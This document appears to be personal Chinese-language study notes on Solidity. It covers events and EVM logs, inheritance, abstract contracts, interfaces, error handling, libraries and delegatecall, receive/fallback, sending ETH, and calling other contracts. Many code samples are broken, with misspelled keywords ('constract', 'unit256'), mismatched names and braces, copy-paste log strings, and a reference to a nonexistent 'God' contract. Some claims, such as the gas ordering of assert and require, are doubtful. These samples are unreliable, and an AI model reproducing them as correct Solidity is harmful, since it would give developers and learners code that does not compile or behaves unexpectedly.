<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">event Transfer(address indexed from,address indexed to,uint256 value);</span><br><span class="line">//from:转账地址</span><br><span class="line">//to:接收地址</span><br><span class="line">//value:转账数量</span><br><span class="line">//其中from&amp;to前面带有indexed关键字，他们会保存在以太坊虚拟机日志的topics中，方便之后检索</span><br></pre></td></tr></table></figure>



<ol start="4">
<li><h4 id="释放事件"><a href="#释放事件" class="headerlink" title="释放事件"></a>释放事件</h4></li>
</ol>
<p>释放事件（Emit Event）是指在区块链上发布特定事件通知的操作。</p>
<p>通过释放事件，合约可以在发生某些操作（如状态改变、资金转移等）时，向链上日志系统发送记录。</p>
<p>事件通常用于通知外部应用程序，如前端应用或监听工具，便于监控合约状态的变化</p>
<p><strong>关键字</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Emit</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//定义_transfer函数，执行转账逻辑</span><br><span class="line">function_tranfer(</span><br><span class="line">	address from,</span><br><span class="line">	address to;</span><br><span class="line">	uint256 amount</span><br><span class="line">)external&#123;</span><br><span class="line"></span><br><span class="line">    _balance[from] = 10000000;//给转账地址一些初始代币</span><br><span class="line">    _balances[from] -=  amount; // from地址减去转账数量</span><br><span class="line">    _balances[to] += amount; // to地址加上转账数量</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    //释放事件</span><br><span class="line">    emit Transfer(from,to,amount);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ol start="5">
<li><h4 id="EVM日志"><a href="#EVM日志" class="headerlink" title="EVM日志"></a>EVM日志</h4></li>
</ol>
<p>​     <strong>EVM用日志log来存储solidity事件，每条日志记录包括主题topics和数据data两部分</strong></p>
<p>​	5.1 <strong>主题topics</strong>（？)</p>
<p>​		<span style = "color: red;"><strong>用于描述事件，长度不能超过4。它的第一个元素是事件的签名（哈希）</strong></span></p>
<p>​     eg: 例如对于上面的transfer事件，它的事件哈希：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">keccak256(&quot;Transfer(address,address,unit256)&quot;)</span><br><span class="line"></span><br><span class="line">//0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef</span><br></pre></td></tr></table></figure>



<p>​		<strong>除了事件哈希，主题还可以包含<span style = "color: red;">至多3个indexed参数</span>，也就是Transfer事件中的from和to。</strong></p>
<p>​    5.2 <strong>数据data</strong></p>
<p>​			<strong>事件中不带 indexed的参数会被存储在 data 部分中</strong>，可以理解为事件的“值”。data 部分的变量不能被直接检索，但可以存储任意大小的数据。因此一般 data 部分可以用来存储复杂的数据结构，例如数组和字符串等等，因为这些数据超过了256比特，即使存储在事件的 topics 部分中，也是以哈希的方式存储。另外，data 部分的变量在存储上消耗的gas相比于 topics 更少。</p>
<p>​	5.3 <strong>在Etherscan上查询事件</strong></p>
<p>当尝试用**_transfer()<strong>函数在</strong>Sepolia<strong>测试网络上转账100代币，可以在</strong>Etherscan<strong>上查询到相应的</strong>tx**：<a href="https://sepolia.etherscan.io/tx/0xb07dcd9943662e2e8b17c7add370f046401962ce24d0690a61bb249a385dc8c9#eventlog">网址</a>。</p>
<p>​	点击<strong>Logs</strong>按钮，就能看到事件明细</p>
<p>​	Topics里面有三个元素，[0]是这个事件的哈希，[1]和[2]是我们定义的两个indexed变量的信息，即转账的转出地址和接收地址。Data里面是剩下的不带indexed的变量，也就是转账数量。</p>
<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><ol>
<li><h4 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h4></li>
</ol>
<p>1.1  <strong>virtual</strong></p>
<p>​	父合约中的函数，如果希望子合约重写，需要加上<strong>virtual</strong>关键字。</p>
<p>1.2 <strong>override</strong>：</p>
<p>​	子合约重写了父合约中的函数，需要加上<strong>override</strong>关键字。</p>
<p><strong>注意</strong>：用<strong>override</strong>修饰<strong>public</strong>变量，会重写与变量同名的<strong>getter</strong>函数</p>
<ol start="2">
<li><h4 id="简单继承"><a href="#简单继承" class="headerlink" title="简单继承"></a>简单继承</h4></li>
</ol>
<p>​	先写一个简单的A合约</p>
<p>​	再定义一个B合约，让他继承A合约</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract B is A</span><br></pre></td></tr></table></figure>



<ol start="3">
<li><h4 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h4></li>
</ol>
<p>​		规则：</p>
<ol>
<li><p><strong>继承时要按辈分最高到最低的顺序排</strong>。</p>
<p>eg:比如我们写一个Erzi合约，继承Yeye合约和Baba合约，那么就要写成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Erzi is Yeye, Baba</span><br></pre></td></tr></table></figure>

<p>而不能写成contract Erzi is Baba, Yeye，不然就会报错。</p>
</li>
<li><p><strong>如果某一个函数在多个继承的合约里都存在，在子合约里必须重写，不然会报错</strong></p>
</li>
<li><p><strong>重写在多个父合约中都重名的函数时，override关键字后面要加上所有父合约名字</strong></p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">override(Yeye, Baba)</span><br></pre></td></tr></table></figure>

<h4 id="4-修饰器的继承"><a href="#4-修饰器的继承" class="headerlink" title="4. 修饰器的继承"></a>4. <strong>修饰器的继承</strong></h4><p>​		用法与函数继承类似，在相应的地方加virtual和override关键字即可。</p>
<h4 id="5-构造函数的继承"><a href="#5-构造函数的继承" class="headerlink" title="5. 构造函数的继承"></a>5. 构造函数的继承</h4><p>​	子合约有两种方法继承父合约的构造函数:</p>
<pre><code>1. **在继承时声明父构造函数的参数**
</code></pre>
<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract B is A(1)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><strong>在子合约的构造函数中声明构造函数的参数</strong></li>
</ol>
<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract C is A &#123;</span><br><span class="line">    constructor(uint _c) A(_c * _c) &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ol start="6">
<li><h4 id="调用父合约的继承"><a href="#调用父合约的继承" class="headerlink" title="调用父合约的继承"></a>调用父合约的继承</h4></li>
</ol>
<p>​	子合约有两种方式调用父合约的函数：</p>
<ol>
<li><strong>直接调用</strong></li>
</ol>
<p>​		子合约直接用<strong>父合约名.函数名（）</strong>的方式来调用父合约函数</p>
<p>eg: Yeye.pop()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callParent() public&#123;</span><br><span class="line">		Yeye.pop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ol start="2">
<li><strong>Super关键字</strong></li>
</ol>
<p>​	子合约可以利用**super.函数名()**来调用最近的父合约函数。</p>
<p>eg:</p>
<p>​	当Solidity继承关系按声明时从右到左的顺序是：contract Erzi is Yeye, Baba，那么Baba是最近的父合约，super.pop()将调用Baba.pop()而不是Yeye.pop()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callParentSuper() public&#123;</span><br><span class="line">	super.pop();</span><br><span class="line">	//此处调用的是Baba.pop()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ol start="7">
<li><h4 id="钻石继承"><a href="#钻石继承" class="headerlink" title="钻石继承"></a><strong>钻石继承</strong></h4></li>
</ol>
<p>​	指一个派生类同时有两个或两个以上的基类。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">	yeye</span><br><span class="line">	/  \</span><br><span class="line">baba	mama</span><br><span class="line">	\  /</span><br><span class="line">	 me</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Yeye&#123;</span><br><span class="line"></span><br><span class="line">	event Log(string message);</span><br><span class="line">	</span><br><span class="line">	function foo() public virtual&#123;</span><br><span class="line">		emit Log(&quot;Yeye.foo called&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	function bar() public virtual&#123;</span><br><span class="line">		emit Log(&quot;Yeye.foo called&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//baba继承yeye</span><br><span class="line">contract Baba is Yeye&#123;</span><br><span class="line">	function foo() public virtual override&#123;</span><br><span class="line">		emit Log(&quot;Baba.foo called&quot;);</span><br><span class="line">		super.foo();</span><br><span class="line">	&#125; </span><br><span class="line">	</span><br><span class="line">	function bar() public virtual override&#123;</span><br><span class="line">		emit Log(&quot;Eve.bar called&quot;);</span><br><span class="line">		super.bar();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">//mama继承yeye</span><br><span class="line">contract Mama is Yeye&#123;</span><br><span class="line">	function foo() public virtual override&#123;</span><br><span class="line">		emit Log(&quot;Baba.foo called&quot;);</span><br><span class="line">		super.foo();</span><br><span class="line">	&#125; </span><br><span class="line">	</span><br><span class="line">	function bar() public virtual override&#123;</span><br><span class="line">		emit Log(&quot;Mama.bar called&quot;);</span><br><span class="line">		super.bar();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">//me继承mama baba</span><br><span class="line">contract me is Baba,mama&#123;</span><br><span class="line">	function foo() public override(Baba,Mama)&#123;</span><br><span class="line">		super.foo();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	function bar() public override(Baba,Mama)&#123;</span><br><span class="line">		super.bar();</span><br><span class="line">		//此处Super.bar会依次调用baba,mama最后是god合约</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>(当然现实辈分关系具体不是这样，只是代指三个层次)</p>
<p>所谓钻石，即<strong>虽然Baba,Mama都是Yeye的子合约，但整个过程中，God合约只会被调用一次</strong></p>
<p>(因为solidity强制一个由基类构成的DAG（有向无环图）使其保证一个特定的顺序)</p>
<h3 id="抽象合约"><a href="#抽象合约" class="headerlink" title="抽象合约"></a><strong>抽象合约</strong></h3><p>​	如果一个智能合约里至少有一个未实现的函数，即某个函数缺少主体**{}<strong>中的内容，则必须将该合约标为</strong>abstract**，不然编译会报错。</p>
<p>未实现的函数需要加<strong>virtual</strong>，以便子合约重写。拿插入排序合约为例，如果我们还没想好具体怎么实现插入排序函数，那么可以把合约标为<strong>abstract</strong>，之后让别人补写上。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">constract Sort&#123;</span><br><span class="line"></span><br><span class="line">abstract constract Insertsort&#123;</span><br><span class="line">	function insertionSort(uint[] memory a)public pure virtual returns(uint[] memory)&#123;</span><br><span class="line">	/*for(uint i = 0; i &lt; a.length;i++)&#123;</span><br><span class="line">	uint temp = a[i];</span><br><span class="line">	uint j = i;</span><br><span class="line">	while(j &gt; 0 &amp;&amp; temp &lt;a[j - 1])&#123;</span><br><span class="line">		a[j] = a[j - 1];</span><br><span class="line">		j--;</span><br><span class="line">			&#125;</span><br><span class="line">			a[j] = temp;</span><br><span class="line">		&#125;</span><br><span class="line">		return 0;</span><br><span class="line">		*/</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*Solidity中最常用的变量类型是uint，也就是正整数，取到负值的话，会报underflow错误。而在插入算法中，变量j有可能会取到-1，引起报错。这里，我们需要把j加1，让它无法取到负值。*/</span><br></pre></td></tr></table></figure>





<h3 id="接口（interface）"><a href="#接口（interface）" class="headerlink" title="接口（interface）"></a><strong>接口</strong>（interface）</h3><p><strong>规则</strong>：</p>
<pre><code>1. 接口不能包含状态变量
1. 不能包含构造函数
1. 不能继承除接口外的其他合约
1. 所有函数都必须是external且不能有函数体
1. 继承接口的非抽象合约必须实现接口定义的所有功能
</code></pre>
<p>接口提供了两个重要的信息：</p>
<ol>
<li>合约里每个函数的<strong>bytes4</strong>选择器，以及函数签名<strong>函数名(每个参数类型）</strong>。</li>
<li>接口id（更多信息见<a href="https://eips.ethereum.org/EIPS/eip-165">EIP165</a>）</li>
</ol>
<p>另外，接口与合约<strong>ABI</strong>（Application Binary Interface）等价，可以相互转换：编译接口可以得到合约的<strong>ABI</strong>，利用<a href="https://gnidan.github.io/abi-to-sol/">abi-to-sol工具</a>，也可以将<strong>ABI json</strong>文件转换为<strong>接口sol</strong>文件。</p>
<p><strong>接口和常规合约的区别在于每个函数都以;代替函数体{ }结尾。</strong></p>
<p>什么时候使用接口：</p>
<p>我们不需要知道它的源代码，只需知道它的合约地址，用对应的接口就可以与它交互。都可以写模版并且减少代码冗余。</p>
<h3 id="三种抛出异常"><a href="#三种抛出异常" class="headerlink" title="三种抛出异常"></a><strong>三种抛出异常</strong></h3><h4 id="1-error"><a href="#1-error" class="headerlink" title="1. error"></a><strong>1. error</strong></h4><p>​	可以在contract之外定义异常。</p>
<p>Eg : 我们定义一个<strong>TransferNotOwner</strong>异常，当用户不是代币<strong>owner</strong>的时候尝试转账，会抛出错误：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error TransferNotOwner(); *//* *自定义error*</span><br></pre></td></tr></table></figure>



<p>我们也可以定义一个<strong>携带参数的异常</strong>，来提示尝试转账的账户地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error TransferNotOwner(address sender); // 自定义的带参数的error</span><br></pre></td></tr></table></figure>

<p><strong>在执行当中，error必须搭配revert（回退）命令使用</strong></p>
<h4 id="2-Require"><a href="#2-Require" class="headerlink" title="2. Require"></a>2. Require</h4><p>​		它很好用，唯一的缺点就是gas随着描述异常的字符串长度增加，比error命令要高</p>
<p>使用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(检查条件，“异常的描述”)</span><br></pre></td></tr></table></figure>

<p>​	当检查条件不成立的时候，就会抛出异常</p>
<h4 id="3-Assert"><a href="#3-Assert" class="headerlink" title="3. Assert"></a>3. Assert</h4><p>比require少个字符串，即不能抛出异常的原因</p>
<p>assert命令一般用于程序员写程序debug，它的用法很简单</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assert(检查条件）</span><br></pre></td></tr></table></figure>

<p>当检查条件不成立的时候，就会抛出异常。</p>
<h4 id="三种方法的gas比较"><a href="#三种方法的gas比较" class="headerlink" title="三种方法的gas比较"></a>三种方法的gas比较</h4><p><span style = "color: blue;">error方法gas最少，其次是assert，require方法消耗gas最多</span></p>
<p>因此，error既可以告知用户抛出异常的原因，又能省gas要多用！</p>
<h3 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h3><p>实参匹配：调用重载函数时，会把输入的实际参数和函数参数的变量类型做匹配。</p>
<p> 如果出现多个匹配的重载函数，则会报错</p>
<p><strong>overloading</strong>:即名字相同但输入参数类型不同的函数可以同时存在，他们被视为不同的函数。</p>
<p><strong>solidity不允许修饰器（modifier）重载</strong></p>
<h3 id="库合约"><a href="#库合约" class="headerlink" title="库合约"></a>库合约</h3><p>​	库合约是一系列的函数合集，用于提升solidity代码的复用性和减少gas而存在</p>
<p>​	他和普通合约主要有以下几点不同：</p>
<ol>
<li>不能存在状态变量</li>
<li>不能够继承或被继承</li>
<li>不能接收以太币</li>
<li>不可以被销毁</li>
</ol>
<p>​	库合约中的函数可见性如果被设置为public或者external，则在调用函数时会触发一次delegatecall。而如果被设置为internal，则不会引起。对于设置为private可见性的函数来说，其仅能在库合约中可见，在其他合约中不可用。</p>
<p><strong>delegatecall</strong>: </p>
<p><code>delegatecall</code> 是一种特殊的低级函数调用，用于将当前合约的上下文（包括<code>msg.sender</code>和<code>msg.value</code>等）传递给另一个合约的函数执行。<code>delegatecall</code> 允许合约在不改变调用者上下文的情况下执行另一个合约的代码。</p>
<p><strong><code>delegatecall</code> 的作用</strong></p>
<ul>
<li><strong>共享存储</strong>：<code>delegatecall</code> 是调用另一个合约的代码，并在调用者合约的存储上下文中执行。这意味着被调用合约的代码会对调用合约的存储变量进行读写。</li>
<li><strong>保持调用者上下文</strong>：<code>msg.sender</code> 和 <code>msg.value</code> 等上下文信息保持不变，依旧指向调用者，这和普通的合约调用不同。</li>
<li><strong>代码重用</strong>：使用 <code>delegatecall</code> 可以使多个合约共享同一段逻辑代码，通过代理模式实现合约的代码复用。</li>
</ul>
<h4 id="Strings库合约"><a href="#Strings库合约" class="headerlink" title="Strings库合约"></a><strong>Strings库合约</strong></h4><p>Strings库合约是将uint256类型转换为相应的string类型的代码库</p>
<p><strong>如何利用</strong>：</p>
<p>​	用using for 指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">using A for B</span><br></pre></td></tr></table></figure>



<p>​	用于附加库合约（从库A）到任何类型（B)。添加完指令后，库A中的函数会自动添加为B类型变量的成员，可以直接调用。</p>
<p>注意： 在调用的时候，这个变量会被当作第一个参数传递给函数</p>
<p><strong>直接通过库合约名称调用函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//利用using for指令</span><br><span class="line"></span><br><span class="line">using String for uint256;</span><br><span class="line">function getString1(uint256_number)public pure returns(string memory)&#123;</span><br><span class="line">	</span><br><span class="line">	//库合约中的函数会自动添加为uint256型变量的成员</span><br><span class="line">	</span><br><span class="line">	return _number.toHexString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>常用库合约</strong>：</p>
<p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Strings.sol">Strings</a>：将<code>**uint256**</code>转换为<code>**String**</code></p>
<p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Address.sol">Address</a>：判断某个地址是否为合约地址</p>
<p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Create2.sol">Create2</a>：更安全的使用<code>**Create2 EVM opcode**</code></p>
<p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Arrays.sol">Arrays</a>：跟数组相关的库合约</p>
<h3 id="引用Import"><a href="#引用Import" class="headerlink" title="引用Import"></a>引用Import</h3><p>​	引用（import）在代码中的<strong>位置为： 在声明版本号之后，在其余代码之前</strong></p>
<p>​	import语句可以帮助我们在一个文件中引用另一个文件的内容</p>
<h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><ol>
<li>通过源文件相对位置导入</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//通过文件相对位置import</span><br><span class="line">import &#x27;./name.sol&#x27;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>通过源文件网址导入网上的合约的全局符号</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//通过网址引用</span><br><span class="line">import&#x27;url&#x27;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>通过npm的目录导入</p>
</li>
<li><p>通过指定全局符号导入合约特定的全局符号</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import &#123;name&#125; from&#x27;./name.sol&#x27;</span><br></pre></td></tr></table></figure>

<p>​	其中的 <code>name</code> 就是一个 <em>全局符号</em>。它可以是一个具体的合约、库、结构体、枚举或函数的名称。通过 <code>import</code> 语句，可以从指定的文件（例如 <code>name.sol</code>）中导入该符号，以便在当前文件中直接使用。</p>
<h3 id="回调函数receive-fallback"><a href="#回调函数receive-fallback" class="headerlink" title="回调函数receive&amp;fallback"></a>回调函数receive&amp;fallback</h3><h4 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h4><pre><code>1. 接受ETH
1. 处理合约中不存在的函数调用（代理合约proxy contract）
</code></pre>
<p>（所以：fallback 和 receive 函数<strong>无法在合约内部直接调用</strong>。这些特殊函数只能通过外部调用触发，通常在接收以太币或处理未知的函数调用时<strong>自动执行</strong></p>
<h4 id="接收ETH函数receive"><a href="#接收ETH函数receive" class="headerlink" title="接收ETH函数receive"></a>接收ETH函数receive</h4><p>a. 在合约收到ETH转账时被调用</p>
<p>b. 一个合约最多有一个receive()函数</p>
<p>c. 声明方式: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">receive() external payable &#123; ... &#125; [不需要function关键字]</span><br></pre></td></tr></table></figure>

<p>d.  receive()函数不能有任何的参数，不能返回任何值，必须包含external和payable</p>
<p>receive()最好不要执行太多的逻辑，receive()太复杂可能会触发Out of Gas报错</p>
<h4 id="回退函数fallback"><a href="#回退函数fallback" class="headerlink" title="回退函数fallback"></a>回退函数fallback</h4><p>a.   在调用合约不存在的函数时被触发</p>
<p>b.   可用于接收ETH，也可以用于代理合约proxy contract</p>
<p>c.   声明时不需要function关键字，必须由external修饰，一般也会用payable修饰</p>
<p>Eg: 用于接收ETH:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fallback() external payable &#123; ... &#125;</span><br></pre></td></tr></table></figure>



<h4 id="二者区别"><a href="#二者区别" class="headerlink" title="二者区别"></a>二者区别</h4><ol>
<li><p>合约接收ETH时，msg.data为空且存在Receive()时，会触发receive()；msg.data不为空或不存在receive()时，会触发fallback()，此时fallback()必须为payable</p>
</li>
<li><p>receive()和payable fallback()均不存在的时候，向合约直接发送ETH将会报错</p>
<p>（你仍可以通过带有payable的函数向合约发送ETH）</p>
</li>
</ol>
<p><img src="https://s2.loli.net/2024/11/18/9GL52VTyYbe8xsH.png" alt="1.png">	</p>
<p>​	在这个场景中，vitalik 向合约 ReceiveETH 发起了一笔带有 msg.data（0xaa）的低级交互，同时设置了 value 为 100 Wei。让我们分析代码：</p>
<ul>
<li>合约 ReceiveETH 中定义了一个 receive() 函数，该函数是 external 和 payable 的，但 receive() 函数只能在没有 msg.data 的情况下被调用。</li>
<li>由于 msg.data 不为空（0xaa），这次调用不会触发 receive() 函数。</li>
<li>合约也没有定义 fallback 函数，所以任何带有 msg.data 且没有匹配函数签名的调用将会导致交易失败。</li>
</ul>
<p><strong>结论</strong></p>
<p>这次调用将失败，并抛出错误，因为合约没有 fallback 函数来处理包含 msg.data 的调用。</p>
<p>所以会出现报错：error:’Fallback’ function is not defined, value和msg.data均发送失败</p>
<h3 id="发送ETH"><a href="#发送ETH" class="headerlink" title="发送ETH"></a>发送ETH</h3><ol>
<li><p><strong>transfer()</strong></p>
</li>
<li><p><strong>send()</strong></p>
</li>
<li><p><strong>call()，其中call()是被鼓励的用法。</strong></p>
</li>
</ol>
<p>首先构造发送ETH合约SendETH，并在其中实现payable的构造函数和receive()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract SendETH&#123;</span><br><span class="line"></span><br><span class="line">	//构造函数，payable使得部署的时候可以转eth进去</span><br><span class="line">    constructor() payable&#123;&#125;</span><br><span class="line">    //receive方法 接受eth时被触发</span><br><span class="line">    receive() external payable&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="1-transfer"><a href="#1-transfer" class="headerlink" title="1. transfer"></a>1. transfer</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">接收方地址.transfer(发送eth的数额)</span><br></pre></td></tr></table></figure>

<p>·    <strong>transfer()<strong>的</strong>gas</strong>限制是<strong>2300</strong>，足够用于转账，但对方合约的**fallback()<strong>或</strong>receive()**函数不能实现太复杂的逻辑。</p>
<p>·    <strong>transfer()<strong>如果转账失败（eg: amount&gt;value），会自动</strong>revert</strong>（回滚交易）。</p>
<p> amount：通常表示用户或合约希望发送的 ETH 的数量。这里 amount 是一个变量，表示转账时指定的具体金额（单位为 wei）。</p>
<p>value：指交易中随附的 ETH 数量，通常由 msg.value 表示。这是调用合约时由发送方附加的 ETH 数量，通常用于支付给其他地址或完成购买。value 只能在 payable 函数中被使用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//用transfer()发送ETH,_to填reveive合约地址，amount填ETH转账金额</span><br><span class="line">function transferETH(address payable _to,uint256 amount) external payable&#123;</span><br><span class="line">	_to.transfer(amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="2-send"><a href="#2-send" class="headerlink" title="2. send"></a>2. send</h4><p><strong>用法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">接收方地址.send(发送ETH数额)</span><br></pre></td></tr></table></figure>

<p>·    <strong>send()<strong>的</strong>gas</strong>限制是<strong>2300</strong>，足够用于转账，但对方合约的**fallback()<strong>或</strong>receive()**函数不能实现太复杂的逻辑。</p>
<p>·    <strong>send()<strong>如果转账失败，不会</strong>revert</strong>。</p>
<p>·    <strong>send()<strong>的返回值是</strong>bool</strong>，代表着转账成功或失败，需要额外代码处理一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error SendFailed(); // 用send发送ETH失败error</span><br><span class="line">// send()发送ETH</span><br><span class="line">function sendETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">    // 处理下send的返回值，如果失败，revert交易并发送error</span><br><span class="line">    bool success = _to.send(amount);</span><br><span class="line">    if(!success)&#123;</span><br><span class="line">        revert SendFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="3-Call"><a href="#3-Call" class="headerlink" title="3.Call"></a><strong>3.Call</strong></h4><p><strong>用法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">接收方地址.call&#123;value: 发送ETH数额&#125;(&quot;&quot;)</span><br></pre></td></tr></table></figure>

<p>·    <strong>call()<strong>没有</strong>gas</strong>限制，可以支持对方合约**fallback()<strong>或</strong>receive()**函数实现复杂逻辑。</p>
<p>·    <strong>call()<strong>如果转账失败，不会</strong>revert</strong>。</p>
<p>·    <strong>call()<strong>的返回值是</strong>(bool, bytes)<strong>，其中</strong>bool</strong>代表着转账成功或失败，需要额外代码处理一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error CallFAiled()// 用call发送ETH失败error</span><br><span class="line"></span><br><span class="line">// call()发送ETH</span><br><span class="line">function callETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">    // 处理下call的返回值，如果失败，revert交易并发送error</span><br><span class="line">    (bool success,) = _to.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">    if(!success)&#123;</span><br><span class="line">        revert CallFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>·    <strong>call</strong>没有<strong>gas</strong>限制，最为灵活，是最提倡的方法；</p>
<p>·    <strong>transfer</strong>有<strong>2300 gas</strong>限制，但是发送失败会自动<strong>revert</strong>交易，是次优选择；</p>
<p>·    <strong>send</strong>有<strong>2300 gas</strong>限制，而且发送失败不会自动<strong>revert</strong>交易，几乎没有人用它。</p>
<h3 id="调用其他合约"><a href="#调用其他合约" class="headerlink" title="调用其他合约"></a>调用其他合约</h3><p><strong>如何调用</strong></p>
<p>​	可以利用合约的地址和合约代码（或接口）来创建合约的引用：_Name(_Address)，其中_Name是合约名，应与合约代码（或接口）中标注的合约名保持一致，_Address是合约地址。然后用合约的引用来调用它的函数：_Name(_Address).f()，其中f()是要调用的函数。</p>
<h4 id="1-传入合约地址"><a href="#1-传入合约地址" class="headerlink" title="1.传入合约地址"></a>1.传入合约地址</h4><p>我们可以在函数里传入目标合约地址，生成目标合约的引用，然后调用目标函数。</p>
<p>以调用OtherContract合约的setX函数为例，我们在新合约中写一个callSetX函数，</p>
<p>传入已部署好的OtherContract合约地址_Address和setX的参数x：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callSetX(address _address,uint256 x)external&#123;</span><br><span class="line">	OtherContract(_Address).setX(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>复制OtherContract合约的地址，填入callSetX函数的参数中，成功调用后，调用OtherContract合约中的getX验证x变为123</p>
<h4 id="2-传入合约变量"><a href="#2-传入合约变量" class="headerlink" title="2.传入合约变量"></a>2.传入合约变量</h4><p>我们可以直接在函数里传入合约的引用，只需要把上面参数的<strong>address类型改为目标合约名</strong></p>
<p>比如上述的OtherContract</p>
<p>(ps: 该函数参数OtherContract _Address底层类型仍然是address，生成的ABI中、调用callGetX时传入的参数都是address类型)</p>
<p>例子： </p>
<p>通过传入合约变量调用目标合约的函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callGetX(OtherContract _Address) external view returns(uint x)&#123;</span><br><span class="line">	x = _Address.getX();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>复制OtherContract合约的地址，填入callGetX函数的参数中，调用后成功获取x的值</p>
<h4 id="3-创建合约变量"><a href="#3-创建合约变量" class="headerlink" title="3. 创建合约变量"></a>3. 创建合约变量</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callGetX(address _Address) external view returns(uint x)&#123;</span><br><span class="line"></span><br><span class="line">	//创建变量</span><br><span class="line">	OtherContract oc = OtherContract(_Address);//oc为OtherContract别名</span><br><span class="line">	x = oc.getX;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>复制OtherContract合约的地址，填入callGetX2函数的参数中，调用后成功获取x的值</p>
